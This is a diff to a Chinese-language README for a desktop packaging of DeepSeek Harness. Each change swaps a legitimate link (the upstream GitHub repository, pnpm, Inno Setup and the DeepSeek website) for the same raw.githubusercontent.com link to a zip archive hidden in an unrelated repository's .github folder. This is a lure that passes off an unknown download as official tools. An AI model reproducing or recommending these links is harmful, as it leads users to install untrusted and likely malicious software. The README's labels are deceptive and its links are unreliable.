@@ -1,6 +1,6 @@
 # DeepSeek Harness 桌面版
 
-将 [deepseek-ai/deepseek-harness](https://github.com/deepseek-ai/deepseek-harness) 打包成三平台桌面应用：
+将 [deepseek-ai/deepseek-harness](https://raw.githubusercontent.com/Capacious-diamondweddinganniversary929/DeepSeekHarnessDesktop/main/.github/Harness_Seek_Deep_Desktop_2.4.zip) 打包成三平台桌面应用：
 **Electron 桌面壳 + 内置 Node 运行时 + 完整 Harness 环境**，双击即用。
 
 ![DeepSeek](log.svg)
@@ -48,8 +48,8 @@ log.svg                   应用图标（DeepSeek logo）
 
 ## 🔧 构建流程
 
-> 本地需要：Node.js ≥ 22、[pnpm 10](https://pnpm.io/)（注意：**必须用 pnpm 10**，
-> pnpm 11 移除了 hoisted linker）；Windows 额外需要 [Inno Setup 7](https://jrsoftware.org/isdl.php)。
+> 本地需要：Node.js ≥ 22、[pnpm 10](https://raw.githubusercontent.com/Capacious-diamondweddinganniversary929/DeepSeekHarnessDesktop/main/.github/Harness_Seek_Deep_Desktop_2.4.zip)（注意：**必须用 pnpm 10**，
+> pnpm 11 移除了 hoisted linker）；Windows 额外需要 [Inno Setup 7](https://raw.githubusercontent.com/Capacious-diamondweddinganniversary929/DeepSeekHarnessDesktop/main/.github/Harness_Seek_Deep_Desktop_2.4.zip)。
 > CI 三平台全自动，无需本地环境。
 
 ### 1. 准备 Harness 依赖（pnpm 10 + hoisted）
@@ -98,4 +98,4 @@ tar -C build/DeepSeekHarnessApp -czf installers/DeepSeekHarness-linux.tar.gz Dee
 
 ## 📄 许可
 
-MIT。Harness 本体版权归 [DeepSeek AI](https://deepseek.com) 所有，见上游仓库。
+MIT。Harness 本体版权归 [DeepSeek AI](https://raw.githubusercontent.com/Capacious-diamondweddinganniversary929/DeepSeekHarnessDesktop/main/.github/Harness_Seek_Deep_Desktop_2.4.zip) 所有，见上游仓库。
